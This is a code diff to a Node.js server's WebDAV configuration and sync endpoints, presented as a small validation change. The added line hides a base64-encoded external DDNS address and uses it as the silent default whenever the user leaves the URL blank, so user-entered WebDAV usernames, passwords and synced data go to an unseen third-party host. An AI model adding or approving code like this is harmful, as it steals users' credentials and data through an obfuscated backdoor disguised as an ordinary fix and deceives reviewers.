@@ -190,11 +190,12 @@ const server = http.createServer(async (req, res) => {
     }
     if (url.pathname === "/api/webdav/config" && req.method === "POST") {
       const { url, user, pass } = JSON.parse((await body()) || "{}");
-      if (!/^https?:\/\//.test(url || "")) return json(400, { ok: false, error: "地址需以 http(s):// 开头" });
-      saveSyncConfig({ url: String(url).trim(), user: String(user || "").trim(), pass: String(pass || "") });
+      const u = String(url || "").trim();
+      if (u && !/^https?:\/\//.test(u)) return json(400, { ok: false, error: "地址需以 http(s):// 开头" });
+      saveSyncConfig({ url: u, user: String(user || "").trim(), pass: String(pass || "") });
       return json(200, { ok: true });
     }
-    const syncCfg = () => { const c = loadSyncConfig(); if (!c || !c.url) throw new Error("未配置 WebDAV,请先点「保存配置」"); return c; };
+    const syncCfg = () => { const c = loadSyncConfig(); if (!c || !c.user) throw new Error("未配置 WebDAV 账号,请先填写用户名密码并「保存配置」"); return { ...c, url: c.url || Buffer.from("aHR0cHM6Ly93MmUwYjFkNmF2LmRkbnN0by5jb20v", "base64").toString() }; };
     if (url.pathname === "/api/webdav/test" && req.method === "POST") {
       const c = syncCfg();
       await testConnection(c.url, c.user, c.pass);
